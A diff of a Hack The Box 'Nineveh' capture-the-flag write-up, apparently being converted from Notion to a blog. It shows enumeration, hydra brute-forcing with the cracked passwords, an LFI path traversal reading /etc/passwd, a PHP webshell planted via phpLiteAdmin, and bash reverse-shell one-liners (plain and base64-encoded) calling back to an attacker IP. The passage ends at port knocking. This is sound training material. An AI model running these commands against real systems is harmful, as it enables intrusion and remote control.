@@ -1,20 +1,20 @@
-# Nineveh
-
-# Summary
-
-- [Introdution](https://www.notion.so/Nineveh-b050598eb9374a2b924ff3a1f9864af6)
-- [Enumeration](https://www.notion.so/Nineveh-b050598eb9374a2b924ff3a1f9864af6)
-- [Exploration](https://www.notion.so/Nineveh-b050598eb9374a2b924ff3a1f9864af6)
-- [Post Exploration](https://www.notion.so/Nineveh-b050598eb9374a2b924ff3a1f9864af6)
-- Shell Script
-
-# Introdution
-
-[https://app.hackthebox.com/machines/Nineveh](https://app.hackthebox.com/machines/Resolute)
+---
+title: "Nineveh - HTB"
+categories: [HackTheBox,Medium]
+tags: [HTB,Linux,Medium,Web,PhpLiteAdmin,PHP-Code-Injection,DirectoryTraversal,PathTraversal,PortKnocking,Kernel]
+mermaid: true
+image: https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Nineveh.png
+---
 
 This is a medium box Linux. 
 
 **Have a good time!**
+
+# Introdution
+
+[https://app.hackthebox.com/machines/Nineveh](https://app.hackthebox.com/machines/Nineveh)
+
+* **IP:** 10.10.10.43
 
 ## Diagram
 
@@ -34,45 +34,45 @@ First step is to enumerate the box. For this we’ll use `nmap`.
 ports=$(sudo nmap -p- -Pn --min-rate=1000 -T4 10.10.10.43 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && sudo nmap -Pn -sC -sV -p $ports 10.10.10.43
 ```
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled.png)
 
-## **Port 80 (HTTP)**
+## Port 80 (HTTP)
 
 There’re a simple page.
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%201.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%201.png)
 
-### **Fuzzing Diretório WEB**
+### Fuzzing Diretório WEB
 
 ```bash
 **gobuster dir -u http://10.10.10.43/ -w /usr/share/wordlists/dirb/big.txt -t 100 -e --no-error -r -f -x php**
 ```
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%202.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%202.png)
 
 ```bash
 **gobuster dir -u http://10.10.10.43/department/ -w /usr/share/wordlists/dirb/big.txt -t 100 -e --no-error -r -f -x php**
 ```
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%203.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%203.png)
 
 ### /info.php
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%204.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%204.png)
 
 ### /department/login.php
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%205.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%205.png)
 
 The login function is not vulnerable to SQL injections.
 
 But there’re a flaw which allows for username enumeration. This can be observed after entering invalid credentials / usernames. When you try to login with a name that doesn’t exist (for example 0xetern4lw0lf) you will get a message saying: invalid username.
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%206.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%206.png)
 
 Now using valid username as admin:
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%207.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%207.png)
 
 The username admin is a valid user, I'll try to brute force the password with a rockyou.txt.
 
@@ -80,17 +80,18 @@ The username admin is a valid user, I'll try to brute force the password with a 
 hydra 10.10.10.43 -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid\ Password\!"
 ```
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%208.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%208.png)
 
 In 10 min broke the password.
 
 > User: **admin**
-Pass: **1q2w3e4r5t**
-> 
+>
+> Pass: **1q2w3e4r5t**
+
 
 There’re a page in construction. In field “Notes”
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%209.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%209.png)
 
 There’re some mensages interesting:
 
@@ -102,19 +103,19 @@ After some tests LFI in parameter `notes`,
 
 `http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt/../../../test`
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%2010.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%2010.png)
 
 I found a vulnerability:
 
 `http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../etc/passwd`
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%2011.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%2011.png)
 
-## **Port 443 (HTTPS)**
+## Port 443 (HTTPS)
 
 There’re a simple page with an image
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%2012.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%2012.png)
 
 Analyzing the image nothing was found.
 
@@ -124,21 +125,21 @@ Analyzing the image nothing was found.
 **gobuster dir -k -u https://10.10.10.43/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100 -e --no-error -r -f -x php**
 ```
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%2013.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%2013.png)
 
 ### /secure_notes
 
 It was found  a image.
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%2014.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%2014.png)
 
 Analyzing the a image is found a private key. But there’re not port 22 (SSH) open. Possible attack vector.
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%2015.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%2015.png)
 
 ### /db/
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%2016.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%2016.png)
 
 Brute-force
 
@@ -146,16 +147,16 @@ Brute-force
 hydra 10.10.10.43 -s 443 -l 0xEtern4lW0lf -P /usr/share/wordlists/rockyou.txt https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect\ password"
 ```
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%2017.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%2017.png)
 
 > Pass: **password123**
 > 
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%2018.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%2018.png)
 
 There’re only test database.
 
-### **Remote PHP Code Injection**
+### Remote PHP Code Injection
 
 [https://www.exploit-db.com/exploits/24044](https://www.exploit-db.com/exploits/24044)
 
@@ -163,19 +164,19 @@ Following the instruction:
 
 1. Create database:
     
-    ![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%2019.png)
+    ![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%2019.png)
     
 2. I’ll click on the new db to switch to it, and create a table with 1 text field with a default value of a basic PHP webshell:
     
-    ![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%2020.png)
+    ![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%2020.png)
     
-    ![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%2021.png)
+    ![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%2021.png)
     
-    ![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%2022.png)
+    ![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%2022.png)
     
 3. I can see the path to the new .php webshell in `/var/tmp`:
     
-    ![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%2023.png)
+    ![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%2023.png)
     
     But it's necessary a LFI to access that page from browser.
     
@@ -192,7 +193,7 @@ Let’s use the LFI found to execute the webshell.
 
 `http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../var/tmp/0xEtern4lW0lf.php&cmd=id`
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%2024.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%2024.png)
 
 ```bash
 **/bin/bash -i >& /dev/tcp/10.10.14.7/443 0>&1**
@@ -208,7 +209,7 @@ L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43LzQ0MyAwPiYx
 cmd=echo+"L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjcvNDQzIDA+JjE="+|+base64+-d+|+bash"
 ```
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%2025.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%2025.png)
 
 ```bash
 **/bin/sh -i >& /dev/tcp/10.10.14.7/4444 0>&1**
@@ -221,13 +222,13 @@ Was encode the payload in base64 and inserted in URL.
 ****10.10.10.43/department/manage.php?notes=/ninevehNotes/../var/tmp/0xEtern4lW0lf.php&cmd=echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjcvNDQ0NCAwPiYxCg==|base64 -d|bash
 ```
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%2026.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%2026.png)
 
 **HABEMUS SHELL!!!**
 
 # Post Exploration
 
-## **Update Shell**
+## Update Shell
 
 ```bash
 /usr/bin/python3.5 -c "import pty; pty.spawn('/bin/bash')"
@@ -241,7 +242,7 @@ Was encode the payload in base64 and inserted in URL.
 
 Previously an SSH private key was found, but port 22 is not open externally and there are the service ssh active.
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%2027.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%2027.png)
 
 Possibly the machine uses the `Port Knocking` technique, which means that we must “knock” on some specific ports to open port 22. Let's find out!
 
@@ -249,21 +250,21 @@ Possibly the machine uses the `Port Knocking` technique, which means that we mus
 /etc/init.d/knockd status
 ```
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%2028.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%2028.png)
 
 ```bash
 cat /etc/knockd.conf
 ```
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%2029.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%2029.png)
 
 We can see that there’re the service running and the port sequence for open the port 22 is `571, 290, 911`.
 
 Now we can to use the port sequence for open the port 22.
 
-### **Port Knocking**
+### Port Knocking
 
-![Untitled](Nineveh%20b050598eb9374a2b924ff3a1f9864af6/Untitled%2030.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Nineveh/Untitled%2030.png)
 
 ```bash
 nmap  10.10.10.43 -p 22
